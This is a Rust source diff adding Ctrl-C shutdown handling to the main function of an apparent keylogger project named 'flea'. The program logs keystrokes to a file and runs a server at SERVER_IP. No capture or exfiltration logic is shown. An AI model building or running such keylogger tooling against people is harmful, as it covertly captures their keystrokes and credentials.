@@ -1,5 +1,8 @@
+extern crate exitcode;
+
 use std::{thread, env};
 use std::sync::{Arc, Mutex};
+use std::sync::atomic::{AtomicBool, Ordering};
 
 #[macro_use]
 extern crate log;
@@ -16,6 +19,14 @@ fn main()
 
     info!("Start");
 
+    let running = Arc::new(AtomicBool::new(true));
+    let r = running.clone();
+
+    //Set CTRL-C handler
+    ctrlc::set_handler(move || {
+        r.store(false, Ordering::SeqCst);
+    }).expect("Error setting Ctrl-C handler");
+
     let dir = env::current_dir().expect("Couldn't get current directory!");
     let current_path = dir.join(flealib::keylogger::KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();
 
@@ -29,9 +40,13 @@ fn main()
     });
     
     let flea_server = FleaServer{};
-    flea_server.start(SERVER_IP);
+    flea_server.start(SERVER_IP, &running);
 
     key_logger_data.lock().unwrap().quit = true;
 
     handle.join().unwrap();
+
+    info!("Stop");
+    
+    std::process::exit(exitcode::OK);
 }
